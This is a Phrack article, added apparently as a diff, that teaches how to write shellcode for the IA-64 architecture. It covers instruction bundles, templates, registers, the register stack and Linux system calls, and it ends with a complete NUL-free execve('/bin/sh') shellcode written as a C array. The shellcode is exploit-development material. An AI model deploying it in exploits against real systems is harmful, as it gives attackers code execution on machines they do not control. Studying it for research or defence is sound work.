@@ -1,0 +1,572 @@
+
+                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x39, Phile #0x05 of 0x12
+
+|=-------------------=[ WRITING SHELLCODE FOR IA-64 ]=-------------------=|
+|=-----------=[ or: 'how to turn diamonds into jelly beans' ]------------=|
+|=--------------------=[ papasutra of haquebright ]=---------------------=|
+
+
+- Intro
+- Big Picture
+- Architecture
+  - EPIC
+  - Instructions
+  - Bundles
+  - Instruction Types and Templates
+  - Registers
+  - Register List
+  - Register Stack Engine
+  - Dependency Conflicts
+  - Alignment and Endianness
+  - Memory Protection
+  - Privilege Levels
+- Coding
+  - GCC IA-64 Assembly Language
+  - Useful Instruction List
+  - Optimization
+  - Coding Aspects
+- Example Code
+- References
+- Greetings
+
+
+--> Intro
+
+This paper outlines the techniques you need and the things I've
+learned about writing shellcode for the IA-64. Although the IA-64 is
+capable of executing IA-32 code, this is not topic of this paper.
+Example code is for Linux, but most of this applies to all operating
+systems that run on IA-64.
+
+
+--> Big Picture 
+
+IA-64 is the successor to IA-32, formerly called the i386
+architecture, which is implemented in all those PC chips like Pentium
+and Athlon and so on.
+It is developed by Intel and HP since 1994, and is available in the
+Itanium chip. IA-64 will probably become the main architecture for the
+Unix workstations of HP and SGI, and for Microsoft Windows. It is a 64
+bit architecture, and is as such capable of doing 64 bit integer
+arithmetic in hardware and addressing 2^64 bytes of memory. A very
+interesting feature is the parallel execution of code, for which a
+very special binary format is used.
+So lets get a little more specific.
+
+
+--> EPIC
+
+On conventional architectures, parallel code execution is made
+possible by the chip itself. The instructions read are analyzed,
+reordered and grouped by the hardware at runtime, and therefore only
+very conservative assumptions can be made.
+EPIC stands for 'explicit parallel instruction computing'. It works by
+grouping the code into independent parts at compile time, that is, the
+assembly code must already contain the dependency information.
+
+
+--> Instructions
+
+The instruction size is fixed at 41 bits. Each instruction is made up
+of five fields:
+
++-----------+-----------+-----------+-----------+-----------+
+| opcode    | operand 1 | operand 2 | operand 3 | predicate |
++-----------+-----------+-----------+-----------+-----------+
+| 40 to 27  | 26 to 20  | 19 to 13  | 12 to 6   | 5 to 0    |
++-----------+-----------+-----------+-----------+-----------+
+
+The large opcode space of 14 bits is used for specializing
+operations. For example, there are different branch instructions for
+branches that are taken often and ones taken seldomly. This extra
+information is then used in the branch prediction unit.
+
+There are three operand fields usable for immediate values or register
+numbers. Some instructions combine all three operand fields to a
+single 21 bit immediate value field. It is also possible to append a
+complete 41 bit instruction slot to another one to form a 64 bit
+immediate value field.
+
+The last field references a so called predicate register by a 6 bit
+number. Precicate registers each contain a single bit to represent the
+boolean values 'true' and 'false'. If the value is 'false' at
+execution time, the instruction is discarded just before it takes
+effect. Note that some instructions cannot be predicated.
+
+If a certain operation does not need a certain field in the scheme
+above, it is set to zero by the assembler. I tried to fill in other
+values, and it still worked. But this may not be the case for every
+instruction and every implementation of the IA-64 architecture. So be
+careful about this...
+Also note that there are some shortcut instructions such as mov, which
+for real is just an add operation with register 0 (constant 0) as the
+other argument.
+
+
+--> Bundles
+
+In the compiled code, instructions are grouped together to 'bundles'
+of three. Included in every bundle is a five bit template field that
+specifies which hardware units are needed for the execution.
+So what it boils down to is a bundle length of 128 bits. Nice, eh?
+
++-----------+----------+---------+----------+
+| instr 1   | instr 2  | instr 3 | template |
+|-----------+----------+---------+----------|
+| 127 to 87 | 86 to 46 | 45 to 5 | 4 to 0   |
++-----------+----------+---------+----------+
+
+Templates are used to dispatch the instructions to the different
+hardware units. This is quite straightforward, the dispatcher just has
+to switch over the template bits.
+
+Templates can also encode a so-called 'stop' after instruction slots.
+Stops are used to break parallel instruction execution, and you will
+need them to solve Data Flow Dependencies (see below). You can put a
+stop after every complete bundle, but if you need to save space, it is
+often better to stop after an instruction in the middle of a bundle.
+This does not work for every template, so you need to check the
+template table below for this.
+
+The independent code regions between stops are called instruction
+groups. Making use of the parallel semantics they carry, the Itanium
+for example is capable of executing up to two bundles at once, if
+there are enough execution units for the set of instructions specified
+in the templates. In the next implementations the numbers will be
+higher for sure.
+
+
+--> Instruction Types and Templates
+
+There are different instruction types, grouped by the hardware unit
+they need. Only certain combinations are allowed in a single bundle.
+Instruction types are A (ALU Integer), I (Non-ALU Integer), M
+(Memory), F (Floating Point), B (Branch) and L+X (Extended). The X
+slots may also contain break.i and nop.i for compatibility reasons.
+
+In the following template list, '|' is a stop:
+
+00 M I I
+01 M I I|
+02 M I|I     <- in-bundle stop
+03 M I|I|    <- in-bundle stop
+04 M L X
+05 M L X|
+06 reserved
+07 reserved
+08 M M I
+09 M M I|
+0a M|M I     <- in-bundle stop
+0b M|M I|    <- in-bundle stop
+0c M F I
+0d M F I|
+0e M M F
+0f M M F|
+10 M I B
+11 M I B|
+12 M B B
+13 M B B|
+14 reserved
+15 reserved
+16 B B B
+17 B B B|
+18 M M B
+19 M M B|
+1a reserved
+1b reserved
+1c M F B
+1d M F B|
+1e reserved
+1f reserved
+
+
+--> Registers
+
+This is not a comprehensive list, check [1] if you need one.
+
+IA-64 specifies 128 general (integer) registers (r0..r127). There are
+128 floating point registers, too (f0..f127).
+
+Predicate Registers (p0..p63) are used for optimizing runtime
+decisions. For example, 'if' results can be handled without branches
+by setting a predicate register to the result of the 'if', and using
+that predicate for the conditional code. As outlined above, predicate
+registers are referenced by a field in every instruction. If no
+register is specified, p0 is filled in by the assembler. p0 is always
+'true'.
+
+Branch Registers (b0..b7) are used for indirect branches and
+calling. Branch instructions can only handle branch registers. When
+calling a function, the return address is stored in b0 by
+convention. It is saved to local registers by the called function if
+it needs to call other functions itself.
+
+There are the special registers Loop Count (LC) and Epilogue Count
+(EC). Their use is explained in the optimization chapter.
+
+The Current Frame Marker (CFM) holds the state of the register
+rotation. It is not accessible directly. The Instruction Pointer (IP)
+contains the address of the bundle that is currently executed.
+
+The User Mask (UM):
++-------+-------------------------------------------------------------+
+| flag  | purpose                                                     |
++-------+-------------------------------------------------------------+
+| UM.be | set this to 1 for big endian data access                    |
+| UM.ac | if this is 0, Unaligned Memory Faults are raised only if    |
+|       | the situation cannot be handled by the processor at all     |
++-------+-------------------------------------------------------------+
+The User Mask can be modified from any privilege level (see below).
+
+Some interesting Processor Status Register (PSM) fields:
++---------+-----------------------------------------------------------+
+| flag    | purpose                                                   |
++---------+-----------------------------------------------------------+
+| PSR.pk  | if this is 0, protection key checks are disabled          |
+| PSR.dt  | if this is 0, physical addressing is used for data        |
+|         | access; access rights are not checked.                    |
+| PSR.it  | if this is 0, physical addressing is used for instruction |
+|         | access; access rights are not checked.                    |
+| PSR.rt  | if this is 0, the register stack translation is disabled  |
+| PSR.cpl | this is the current privilege level. See its chapter for  |
+|         | details.                                                  |
++---------+-----------------------------------------------------------+
+All but the last of these fields can only be modifiled from privilege
+level 0 (see below).
+
+
+--> Register List
+
++---------+------------------------------+
+| symbol  | Usage Convention             |
++---------+------------------------------+
+| b0      | Call Register                |
+| b1-b5   | Must be preserved            |
+| b6-b7   | Scratch                      |
+| r0      | Constant Zero                |
+| r1      | Global Data Pointer          |
+| r2-r3   | Scratch                      |
+| r4-r5   | Must be preserved            |
+| r8-r11  | Procedure Return Values      |
+| r12     | Stack Pointer                |
+| r13     | (Reserved as) Thread Pointer |
+| r14-r31 | Scratch                      |
+| r32-rxx | Argument Registers           |
+| f2-f5   | Preserved                    |
+| f6-f7   | Scratch                      |
+| f8-f15  | Argument/Return Registers    |
+| f16-f31 | Must be preserved            |
++---------+------------------------------+
+Additionaly, LC must be preserved.
+
+
+--> Register Stack Engine
+
+IA-64 provides you with a register stack. There is a register frame,
+consisting of input (in), local (loc), and output (out) registers. To
+allocate a stack frame, use the 'alloc' instruction (see [1]). When a
+function is called, the stack frame is shifted, so that the former
+output registers become the new input registers. Note that you need to
+allocate a stack frame even if you only want to access the input
+registers.
+
+Unlike on SPARC, there are no 'save' and 'restore' instructions needed
+in this scheme. Also, the (memory) stack is not used to pass arguments
+to functions. 
+
+The Register Stack Engine also provides you with register
+rotation. This makes modulo-scheduling possible, see the optimization
+chapter for this. The 'alloc' described above specifies how many
+general registers rotate, the rotating region always begins at r32,
+and overlaps the local and output registers. Also, the predicate
+registers p16 to p63 and the floating point register f32 to f127
+rotate.
+
+
+--> Dependency Conflicts
+
+Dependency conflicts are formally classified into three categories:
+
+- Control Flow Conflicts
+
+These occur when assumptions are made if a branch is taken or not.
+For example, the code following a branch instruction must be discarded
+when it is taken. On IA-64, this happens automatically. But if the
+code is optimized using control speculation (see [1]), control flow
+conflicts must be resolved manually. Hardware support is provided.
+
+- Memory Conflicts
+
+The reason for memory conflicts is the higher latency of memory
+accesses compared to register accesses. Memory access is therefore
+causing the execution to stall. IA-64 introduces data speculation (see
+[1]) to be able to move loads to be executed as early as possible in
+the code.
+
+- Data Flow Conflicts
+These occur when there are instructions that share registers or memory
+fields in a block marked for parallel execution. This leads to
+undefined behavior and must be prevented by the coder. This is the
+type of conflict that will bother you the most, especially when trying
+to write compact code!
+
+
+--> Alignment and Endianess
+
+As on many other architectures, you have to align your data and
+code. On IA-64, code must be aligned on 16 byte boundaries, and is
+stored in little endian byte order. Data fields should be aligned
+according to their size, so an 8 bit char should be aligned on 1 byte
+boundaries. There is a special rule for 10 byte floating point numbers
+(should you ever need them), that is you have to align it on 16 byte
+boundaries. Data endianess is controlled by the UM.be bit in the user
+mask ('be' means big endian enable). On IA-64 Linux, little endian is
+default.
+
+
+--> Memory Protection
+
+Memory is divided into several virtual pages. There is a set of
+Protection Key Registers (PKR) that contain all keys required for a
+process. The Operating System manages the PKR. Before memory access is
+permitted, the key of the respective memory field (which is stored in
+the Translation Lookaside Buffer) is compared to all the PKR keys. If
+none matches, a Key Miss fault is raised. If there is a matching key,
+it is checked for read, write and execution rights. Access
+capabilities are calculated from the key's access rights field, the
+privilege level of the memory page and the current privilege level
+of the executing code (see [1] for details). If an operation is to be
+performed which is not covered by the calculated capabilities, a Key
+Permission Fault is generated.
+
+
+--> Privilege Levels
+
+There are four privilege levels numbered from 0..3, with 0 being the
+most privileged one. System instructions and registers can only be
+called from level 0. The current privilege level (CPL) is stored in
+PSR.cpl. The following instructions change the CPL:
+
+- enter privileged code (epc)
+The epc instruction sets the CPL to the privilege level of the page
+containing the epc instruction, if it is numerically higher than the
+CPL. The page must be execute only, and the CPL must not be
+numerically lower than the previous privilege level.
+
+- break
+'break' issues a Break Instruction Fault. As every instruction fault
+on IA-64, this sets the CPL to 0. The immediate value stored in the
+break encoding is the address of the handler.
+
+- branch return
+This resets the CPL to previous value.
+
+
+--> GCC IA-64 Assembly Language
+
+As you should have figured out by now, assembly language is normally
+not used to program a chip like this. The optimization techniques are
+very difficult for a programmer to exploit by hand (although possible
+of course). Assembly will always be used to call some processor ops
+that programming languanges do not support directly, for algoritm
+coding, and for shellcode of course.
+
+The syntax basically works like this:
+(predicate_num) opcode_name operand_1 = operand_2, operand_3
+Example:
+(p1) fmul f1 = f2, f3
+
+As mentioned in the instruction format chapter, sometimes not all
+operand fields are used, or operand fields are combined.
+Additionally, there are some instructions which cannot be predicated.
+
+Stops are encoded by appending ';;' to the last instruction of an
+instruction group. Symbolic names are used to reference procedures, as
+always.
+
+
+--> Useful Instruction List
+
+Although you will have to check [3] in any case, here are a very few
+instructions you may want to check first:
++--------+------------------------------------------------------------+
+| name   | description                                                |
++--------+------------------------------------------------------------+
+| dep    | deposit an 8 bit immediate value at an arbitrary position  |
+|        | in a register                                              |
+| dep    | deposit a portion of one reg into another                  |
+| mov    | branch register to general register                        |
+| mov    | max 22 bit immediate value to general register             |
+| movl   | max 64 bit immediate value to general register             |
+| adds   | add short                                                  |
+| branch | indirect form, non-call                                    |
++--------+------------------------------------------------------------+
+
+
+--> Optimizations
+
+There are some optimization techniques that become possible on
+IA-64. However because the topic of this paper is not how to write
+fast code, they are not explained here. Check [5] for more information
+about this, especially look into Modulo Scheduling. It allows you to
+overlap multiple iterations of a loop, which leads to very compact
+code.
+
+
+--> Coding Aspects
+
+Stack: As on IA-32, the stack grows to the lower memory
+addresses. Only local variables are stored on the stack.
+
+System calls: Although the epc instruction is meant to be used
+instead, Linux on IA-64 uses Break Instruction Faults to do a system
+call. According to [6], Linux will switch to epc some day, but this
+has not yet happened. The handler address used for issuing a system
+call is 0x100000. As stated above, break can only use immediate values
+as handler addresses. This introduces the need to construct the break
+instruction in the shellcode. This is done in the example code below.
+
+Setting predicates: Do that by using the compare (cmp)
+instructions. Predicates might also come handy if you need to fill
+some space with instructions, and want to cancel them out to form
+NOPs.
+
+Getting the hardware: Check [2] or [7] for experimenting with IA-64,
+if you do not have one yourself.
+
+
+--> Example Code
+
+<++> ia64-linux-execve.c !f4ed8837
+/*
+ * ia64-linux-execve.c
+ * 128 bytes.
+ *
+ *
+ * NOTES:
+ *
+ * the execve system call needs:
+ * - command string addr in r35
+ * - args addr in r36
+ * - env addr in r37
+ *
+ * as ia64 has fixed-length instructions (41 bits), there are a few
+ * instructions that have unused bits in their encoding.
+ * i used that at two points where i did not find nul-free equivalents.
+ * these are marked '+0x01', see below.
+ *
+ * it is possible to save at least one instruction by loading bundle[1]
+ * as a number (like bundle[0]), but that would be a less interesting
+ * solution.
+ *
+ */
+
+unsigned long shellcode[] = {
+
+  /* MLX
+   * alloc r34 = ar.pfs, 0, 3, 3, 0   // allocate vars for syscall
+   * movl r14 = 0x0168732f6e69622f    // aka "/bin/sh",0x01
+   * ;; */
+  0x2f6e458006191005,
+  0x631132f1c0016873,
+
+  /* MLX
+   * xor r37 = r37, r37               // NULL
+   * movl r17 = 0x48f017994897c001    // bundle[0]
+   * ;; */
+  0x9948a00f4a952805,
+  0x6602e0122048f017,
+
+  /* MII
+   * adds r15 = 0x1094, r37           // unfinished bundle[1]
+   * or r22 = 0x08, r37               // part 1 of bundle[1]
+   * dep r12 = r37, r12, 0, 8         // align stack ptr
+   * ;; */
+  0x416021214a507801,
+  0x4fdc625180405c94,
+
+  /* MII
+   * adds r35 = -40, r12              // circling mem addr 1, shellstr addr
+   * adds r36 = -32, r12              // circling mem addr 2, args[0] addr
+   * dep r15 = r22, r15, 56, 8        // patch bundle[1] (part 1)
+   * ;; */
+  0x0240233f19611801,
+  0x41dc7961e0467e33,
+
+  /* MII
+   * st8 [r36] = r35, 16              // args[0] = shellstring addr
+   * adds r19 = -16, r12              // prepare branch addr: bundle[0] addr
+   * or r23 = 0x42, r37               // part 2 of bundle[1]
+   * ;; */
+  0x81301598488c8001,
+  0x80b92c22e0467e33,
+
+  /* MII
+   * st8 [r36] = r17, 8               // store bundle[0]
+   * dep r14 = r37, r14, 56, 8        // fix shellstring
+   * dep r15 = r23, r15, 16, 8        // patch bundle[1] (part 2)
+   * ;; */
+  0x28e0159848444001,
+  0x4bdc7971e020ee39,
+
+  /* MMI
+   * st8 [r35] = r14, 25              // store shellstring
+   * cmp.eq p2, p8 = r37, r37         // prepare predicate for final branch.
+   * mov b6 = r19                     // (+0x01) setup branch reg
+   * ;; */
+  0x282015984638c801,
+  0x07010930c0701095,
+
+  /* MIB
+   * st8 [r36] = r15, -16             // store bundle[1]
+   * adds r35 = -25, r35              // correct string addr
+   * (p2) br.cond.spnt.few b6         // (+0x01) branch to constr. bundle
+   * ;; */
+  0x3a301799483f8011,
+  0x0180016001467e8f,
+};
+
+/*
+ * the constructed bundle
+ *
+ * MII
+ * st8 [r36] = r37, -8                // args[1] = NULL
+ * adds r15 = 1033, r37               // syscall number
+ * break.i 0x100000
+ * ;;
+ *
+ * encoding is:
+ * bundle[0] = 0x48f017994897c001
+ * bundle[1] = 0x0800000000421094
+ */
+<-->
+
+--> References
+
+[1] HP IA-64 instruction set architecture guide
+    http://devresource.hp.com/devresource/Docs/Refs/IA64ISA/
+[2] HP IA-64 Linux Simulator and Native User Environment
+    http://www.software.hp.com/products/LIA64/
+[3] Intel IA-64 Manuals
+    http://developer.intel.com/design/ia-64/manuals/
+[4] Sverre Jarp: IA-64 tutorial
+    http://cern.ch/sverre/IA64_1.pdf
+[5] Sverre Jarp: IA-64 performance-oriented programming
+    http://sverre.home.cern.ch/sverre/IA-64_Programming.html
+[6] A presentation about the Linux port to IA-64
+    http://linuxia64.org/logos/IA64linuxkernel.PDF
+[7] Compaq Testdrive Program
+    http://www.testdrive.compaq.com
+
+The register list is mostly copied from [4]
+
+
+--> Greetings
+
+palmers, skyper and scut of team teso
+honx and homek of dudelab
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
